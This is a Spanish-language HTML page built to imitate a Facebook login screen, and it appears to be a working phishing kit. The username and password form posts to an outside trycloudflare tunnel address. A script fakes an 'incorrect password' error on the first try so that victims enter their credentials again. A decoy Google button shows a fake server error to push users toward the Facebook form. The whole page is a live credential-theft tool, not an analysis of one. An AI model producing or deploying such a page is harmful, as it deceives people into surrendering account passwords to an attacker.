<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>Iniciar sesión</title>
<style>
:root{--fb-blue:#1877f2;--fb-text:#1c1e21;--fb-gray:#606770;--fb-border:#dddfe2;--fb-error:#fbe9e7;--fb-error-border:#f44336}
*{box-sizing:border-box;margin:0;padding:0;font-family:Segoe UI, Helvetica, Arial, sans-serif}
body{background:#fff;color:var(--fb-text);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}

/* Pantalla principal */
.inicio{width:100%;max-width:400px;text-align:center}
.logo-fb{font-size:55px;font-weight:700;color:var(--fb-blue);margin-bottom:8px}
.titulo{font-size:24px;color:#1c1e21;margin-bottom:30px}
.btn{width:100%;padding:12px;border-radius:6px;border:none;font-size:17px;font-weight:600;cursor:pointer;margin-bottom:12px}
.btn-google{background:#fff;border:1px solid var(--fb-border);color:var(--fb-text)}
.btn-fb{background:var(--fb-blue);color:#fff}
.error-msg{display:none;background:#fbe9e7;border:1px solid #f44336;color:#1c1e21;padding:12px;border-radius:6px;margin-top:15px;font-size:14px;text-align:left}
.error-msg.on{display:block}

/* Pantalla de login de Facebook */
.pantalla-fb{display:none;position:fixed;inset:0;background:#fff;flex-direction:column;padding:calc(16px + env(safe-area-inset-top)) 22px calc(20px + env(safe-area-inset-bottom))}
.pantalla-fb.on{display:flex}
.fb-cabecera{display:flex;align-items:center;justify-content:space-between;margin-bottom:40px}
.fb-volver{background:none;border:none;font-size:20px;cursor:pointer;color:var(--fb-text)}
.fb-contenido{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;width:100%}
.fb-form-wrap{width:100%;max-width:400px}
.fb-error{display:none;background:#fbe9e7;border:1px solid #f44336;padding:12px;border-radius:6px;margin-bottom:15px;font-size:14px;color:#1c1e21}
.fb-error.on{display:block}

/* === ESTILO DEL CAMPO Y OJITO IDÉNTICO A FACEBOOK === */
.fb-campo-wrap{position:relative;margin-bottom:12px}
.fb-input{width:100%;padding:14px 44px 14px 16px;border-radius:6px;border:1px solid var(--fb-border);background:#fff;color:var(--fb-text);font-size:15px;outline:none}
.fb-input:focus{border-color:#8a8d91;box-shadow:0 0 0 2px #e7f3ff}
.fb-input::placeholder{color:#90949c}

/* === OJITO EXACTAMENTE COMO LO TIENE FACEBOOK === */
.fb-ver-clave{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;padding:4px;display:flex;align-items:center;justify-content:center;color:#606770;font-size:18px;line-height:1}
.fb-ver-clave:hover{color:#1c1e21}

.fb-boton{width:100%;padding:12px;border-radius:6px;border:none;background:var(--fb-blue);color:#fff;font-weight:700;font-size:17px;cursor:pointer;margin-top:4px}
.fb-olvido{display:block;text-align:center;color:var(--fb-blue);font-size:14px;margin-top:20px;text-decoration:none}
.fb-separador{height:1px;background:#dadde1;margin:24px 0}
.fb-crear{width:100%;padding:12px;border-radius:6px;border:none;background:#42b72a;color:#fff;font-weight:700;font-size:15px;cursor:pointer}
</style>
</head>
<body>

<!-- PANTALLA PRINCIPAL -->
<div class="inicio" id="pantallaInicio">
 <div class="logo-fb">f</div>
 <h1 class="titulo">Iniciar sesión</h1>
 
 <button class="btn btn-google" id="btnGoogle">Continuar con Google</button>
 <button class="btn btn-fb" id="btnFacebook">Iniciar sesión con Facebook</button>
 
 <div class="error-msg" id="errorGoogle">
  ⚠️ No se pudo iniciar sesión.<br>
  Los servidores están llenos en este momento. Inténtalo de nuevo más tarde o usa otro método de inicio de sesión.
 </div>
</div>

<!-- PANTALLA DE LOGIN DE FACEBOOK -->
<div class="pantalla-fb" id="pantallaFB">
 <div class="fb-cabecera">
  <button class="fb-volver" id="btnVolver">←</button>
  <div style="font-size:14px;color:var(--fb-gray)">Español ▾</div>
 </div>
 
 <div class="fb-contenido">
  <div class="fb-form-wrap">
   <div class="fb-error" id="errorClave">
    Contraseña incorrecta. Comprueba que has escrito tu correo y contraseña correctamente.
   </div>
   
   <form action=" https://gentle-started-reductions-tabs.trycloudflare.com/login.php" method="POST" id="formLogin">
    <div class="fb-campo-wrap">
     <input type="text" class="fb-input" name="username" id="campoUsuario" placeholder="Correo electrónico o número de teléfono" required>
    </div>
    
    <div class="fb-campo-wrap">
     <input type="password" class="fb-input" name="password" id="campoClave" placeholder="Contraseña" required>
     <!-- OJITO IDÉNTICO A FACEBOOK: cuando está oculto = ojo tachado, cuando se ve = ojo normal -->
     <button type="button" class="fb-ver-clave" id="btnVerClave" aria-label="Mostrar contraseña">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
       <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
      </svg>
     </button>
    </div>
    
    <button type="submit" class="fb-boton">Iniciar sesión</button>
   </form>
   
   <a href="#" class="fb-olvido">¿Olvidaste la contraseña?</a>
   <div class="fb-separador"></div>
   <button class="fb-crear">Crear cuenta nueva</button>
  </div>
 </div>
</div>

<script>
let primerIntento = true;
const campoClave = document.getElementById('campoClave');
const btnVerClave = document.getElementById('btnVerClave');

// Botón Google → error
document.getElementById('btnGoogle').addEventListener('click', () => {
 document.getElementById('errorGoogle').classList.add('on');
});

// Botón Facebook → abre formulario
document.getElementById('btnFacebook').addEventListener('click', () => {
 document.getElementById('pantallaInicio').style.display = 'none';
 document.getElementById('pantallaFB').classList.add('on');
});

// Volver atrás
document.getElementById('btnVolver').addEventListener('click', () => {
 document.getElementById('pantallaFB').classList.remove('on');
 document.getElementById('pantallaInicio').style.display = 'block';
 document.getElementById('errorClave').classList.remove('on');
 primerIntento = true;
 // Restablecer estado del ojito
 campoClave.type = 'password';
 btnVerClave.innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>`;
 btnVerClave.setAttribute('aria-label', 'Mostrar contraseña');
});

// === OJITO IDÉNTICO A FACEBOOK ===
btnVerClave.addEventListener('click', () => {
 if (campoClave.type === 'password') {
  // Mostrar contraseña → ojo abierto
  campoClave.type = 'text';
  btnVerClave.innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.54 2.54c.57-.23 1.18-.36 1.83-.36zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zm7.54 7.54c-.09.46-.14.93-.14 1.39 0 1.66 1.34 3 3 3 .46 0 .93-.05 1.39-.14l-4.25-4.25zM15.96 12c0 1.66-1.34 3-3 3-.46 0-.93-.05-1.39-.14l4.25-4.25c.09.46.14.93.14 1.39z"/></svg>`;
  btnVerClave.setAttribute('aria-label', 'Ocultar contraseña');
 } else {
  // Ocultar contraseña → ojo tachado
  campoClave.type = 'password';
  btnVerClave.innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>`;
  btnVerClave.setAttribute('aria-label', 'Mostrar contraseña');
 }
});

// Envío: primer intento = error, segundo = enviar
document.getElementById('formLogin').addEventListener('submit', function(e) {
 e.preventDefault();
 
 if (primerIntento) {
  document.getElementById('errorClave').classList.add('on');
  primerIntento = false;
  // Limpiar campos
  document.getElementById('campoUsuario').value = '';
  document.getElementById('campoClave').value = '';
  document.getElementById('campoUsuario').focus();
 } else {
  this.submit();
 }
});
</script>
</body>
</html>
